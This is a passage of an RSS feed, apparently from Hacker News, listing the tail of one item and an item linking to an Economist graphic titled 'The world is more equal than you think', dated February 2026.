&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46882184</guid><pubDate>Wed, 04 Feb 2026 06:22:58 +0000</pubDate></item><item><title>The world is more equal than you think</title><link>https://economist.com/graphic-detail/2026/02/03/the-world-is-more-equal-than-you-think</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46882650</guid><pubDate>Wed, 04 Feb 2026 07:33:34 +0000</pubDate></item></channel></rss>